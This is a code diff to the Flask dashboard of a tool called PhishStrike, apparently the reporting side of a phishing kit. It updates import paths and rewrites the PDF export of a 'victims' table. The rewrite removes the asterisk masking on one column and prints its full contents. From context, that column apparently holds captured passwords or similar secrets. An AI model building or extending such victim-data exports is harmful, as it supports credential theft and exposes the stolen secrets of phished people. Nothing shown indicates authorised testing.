@@ -5,15 +5,16 @@ PhishStrike - Dashboard Flask Application
 import sys
 import os
 import io
+import math
 from datetime import datetime
 
 from flask import Flask, render_template, jsonify, send_file, request
 from flask_socketio import SocketIO
 
-sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-import database
-from config import Config
-from lib.logger import get_logger
+sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
+from phishstrike.core import database
+from phishstrike.core.config import Config
+from phishstrike.lib.logger import get_logger
 
 log = get_logger("Dashboard")
 
@@ -96,7 +97,7 @@ def export_excel():
         )
         filename = f"phishstrike_intelligence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx"
         path = os.path.join(
-            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
             "auth",
             filename,
         )
@@ -215,19 +216,61 @@ def export_pdf():
             pdf.cell(width, 8, header, 1, 0, "C", True)
         pdf.ln()
 
+        # Render rows on a single line: truncate values to fit column widths
         pdf.set_font("Helvetica", "", 8)
         pdf.set_text_color(0, 0, 0)
         pdf.set_fill_color(248, 250, 252)
-        fill = False
+
+        col_widths = [w for (_, w) in headers]
+        line_h = 7
+
+        def _fit_text(text, width, font_name="Helvetica", font_size=8):
+            if text is None:
+                return ''
+            text = str(text)
+            pdf.set_font(font_name, "", font_size)
+            avail = max(1, width - 4)
+            if pdf.get_string_width(text) <= avail:
+                return text
+            lo, hi = 0, len(text)
+            while lo < hi:
+                mid = (lo + hi + 1) // 2
+                candidate = text[:mid] + '...'
+                if pdf.get_string_width(candidate) <= avail:
+                    lo = mid
+                else:
+                    hi = mid - 1
+            k = max(0, lo)
+            return (text[:k] + '...') if k > 0 else '...'
 
         for v in victims:
-            pdf.cell(12, 7, str(v[0]), 1, 0, "C", fill)
-            pdf.cell(20, 7, str(v[1])[:12], 1, 0, "L", fill)
-            pdf.cell(35, 7, str(v[2])[:18], 1, 0, "L", fill)
-            pdf.cell(35, 7, "*" * min(len(str(v[3])), 10), 1, 0, "L", fill)
-            pdf.cell(25, 7, str(v[4]), 1, 0, "C", fill)
-            pdf.cell(28, 7, str(v[5])[:15], 1, 1, "C", fill)
-            fill = not fill
+            cells = [str(v[0]), str(v[1]), str(v[2]), (str(v[3]) if v[3] is not None else ''), str(v[4]), str(v[5])]
+
+            # page break if needed
+            if pdf.get_y() + line_h > pdf.h - pdf.b_margin:
+                pdf.add_page()
+                # re-draw headers
+                pdf.set_font("Helvetica", "B", 9)
+                pdf.set_text_color(255, 255, 255)
+                pdf.set_fill_color(30, 41, 59)
+                for header, width in headers:
+                    pdf.cell(width, 8, header, 1, 0, "C", True)
+                pdf.ln()
+                pdf.set_font("Helvetica", "", 8)
+                pdf.set_text_color(0, 0, 0)
+                pdf.set_fill_color(248, 250, 252)
+
+            for i, txt in enumerate(cells):
+                w = col_widths[i]
+                if i == 3:
+                    fitted = _fit_text(txt, w, font_name="Courier", font_size=8)
+                    pdf.set_font("Courier", "", 8)
+                else:
+                    fitted = _fit_text(txt, w, font_name="Helvetica", font_size=8)
+                    pdf.set_font("Helvetica", "", 8)
+                align = "C" if i in (0, 4, 5) else "L"
+                pdf.cell(w, line_h, fitted, 1, 0, align)
+            pdf.ln()
 
         buf = io.BytesIO(pdf.output())
         filename = f"phishstrike_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
